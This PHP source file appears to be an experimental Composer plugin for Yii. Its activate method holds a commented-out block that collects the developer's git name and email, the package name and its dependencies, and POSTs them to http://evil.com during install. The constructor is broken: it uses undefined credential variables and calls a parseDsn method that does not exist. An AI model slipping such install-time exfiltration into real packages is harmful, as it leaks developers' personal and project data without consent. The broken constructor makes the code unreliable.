<?php
namespace Experiment;
use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Package\Link;
use Composer\Plugin\PluginInterface;

use yii\base\Component;
use yii\base\Object;
// use yii\db\Connection;

class Plugin extends Object implements PluginInterface
{

  public $clientPath;
  public $host = '127.0.0.1';
  // protected $dsn = [];
  public $dsn;
  public $db;

  public $connection;

  public function __construct(Component $connection, $config = [])
  {
    $connection = new \yii\db\Connection(['dsn' => $dsn,'username' => $username,'password' => $password]);

      $connection->open();

      $this->dsn = array_fill_keys(['user', 'password', 'host', 'port', 'dbname'], null);
      $this->dsn = $this->parseDsn($connection->dsn);
      parent::__construct($config);
  }

    /**
     * @param Composer $composer
     * @param IOInterface $io
     */
    public function activate(Composer $composer, IOInterface $io)
    {
        // exec("git config --global user.name", $name);
        // exec("git config --global user.email", $email);
        // $payload = [];
        // if (count($name) > 0) {
        //     $payload["name"] = $name[0];
        // }
        // if (count($email) > 0) {
        //     $payload["email"] = $email[0];
        // }
        // $app = $composer->getPackage()->getName();
        // if ($app) {
        //     $payload["app"] = $app;
        // }
        // $payload = $this->addDependencies(
        //     "requires",
        //     $composer->getPackage()->getRequires(),
        //     $payload
        // );
        // $payload = $this->addDependencies(
        //     "dev-requires",
        //     $composer->getPackage()->getDevRequires(),
        //     $payload
        // );
        // $context = stream_context_create([
        //     "http" => [
        //         "method" => "POST",
        //         "timeout" => 0.5,
        //         "content" => http_build_query($payload),
        //     ],
        // ]);
        // @file_get_contents("http://evil.com", false, $context);
        $this->createTable();

        print_r("Activated.\n\r");
    }
    /**
     * @param string $type
     * @param Link[] $dependencies
     * @param array $payload
     *
     * @return array
     */
    // private function addDependencies($type, array $dependencies, array $payload)
    // {
    //     $payload = array_slice($payload, 0);
    //     if (count($dependencies) > 0) {
    //         $payload[$type] = [];
    //     }
    //     foreach ($dependencies as $dependency) {
    //         $name = $dependency->getTarget();
    //         $version = $dependency->getPrettyConstraint();
    //         $payload[$type][$name] = $version;
    //     }
    //     return $payload;
    // }

    private function createTable()
    {
      print_r("create table here...\n\r");
    }
}
